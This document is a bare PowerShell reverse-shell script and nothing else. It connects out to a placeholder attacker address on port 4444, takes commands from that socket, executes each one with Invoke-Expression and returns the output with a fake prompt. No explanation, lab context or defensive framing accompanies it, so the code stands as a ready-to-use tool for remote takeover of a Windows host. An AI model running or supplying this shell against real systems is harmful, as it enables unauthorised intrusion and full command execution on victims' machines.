$client = New-Object System.Net.Sockets.TCPClient('youripaddress', 4444);
$stream = $client.GetStream();
$networkstream = New-Object System.IO.StreamReader($stream,'ASCII');
while(($i = $networkstream.ReadLine()) -ne 'exit')
{
    $output = Invoke-Expression $i | Out-String
    $sendback = $output + 'PS ' + (Get-Location).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
    $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush();
}
$client.Close()
